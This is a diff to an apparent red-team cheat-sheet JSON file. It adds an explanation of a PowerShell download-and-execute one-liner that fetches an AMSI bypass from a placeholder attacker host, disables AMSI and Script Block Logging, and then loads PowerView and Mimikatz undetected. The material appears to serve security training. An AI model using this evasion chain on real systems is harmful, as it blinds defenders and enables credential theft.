@@ -111,5 +111,6 @@
       "MITRE T1562.001",
       "MITRE T1059.001"
     ]
-  }
+  },
+  "explain": "Downloads and executes an in-memory patch that blinds PowerShell defenses before you load tooling:\n  iex (New-Object System.Net.WebClient).DownloadString('...')   fetch the bypass text and run it in this session, nothing touches disk\n  http://<attacker_ip>/<amsi_bypass>.txt   your hosted one-liner (CRTP serves sbloggingbypass.txt and Amsi-Byp.txt)\nAfter it runs, AMSI (AmsiScanBuffer) and Script Block Logging are disabled for the session, so you can iex PowerView/Mimikatz without alerts."
 }
